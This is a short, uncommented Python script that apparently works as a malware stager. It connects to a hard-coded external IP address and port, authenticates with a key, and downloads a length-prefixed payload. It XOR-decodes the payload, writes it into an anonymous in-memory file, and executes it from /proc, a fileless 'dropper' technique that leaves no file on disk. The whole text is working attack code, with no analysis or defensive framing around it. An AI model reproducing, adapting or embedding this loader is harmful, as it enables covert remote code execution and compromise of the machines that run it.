import requests
import socket
import os
import subprocess
HOST = "134.209.231.196"
PORT = 9999
KEY = "k3ifin..1"
encoded_fn = b'\xe6\xe0~\xd6\xe8_\xb7\x0c\x9a}U\xe6e6cJ'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(KEY.encode())
s.send(encoded_fn)
l = s.recv(2)
if l == b"\x69\x69":
    exit()
data = b""
while len(data) < int(l.hex(), 16):
    aux = s.recv(1024)
    if not aux:
        break
    data += aux
s.close()
data = list(data)
for i in range(len(data)):
    data[i] = (data[i] ^ (((((i << 4) + 97436)) ^ 0x69) & 0xff))
dropper = b"".join([bytes([x]) for x in data])
fd = os.memfd_create("a", 1)
os.write(fd, dropper)
subprocess.Popen([""], -1, f"/proc/{os.getpid()}/fd/{fd}")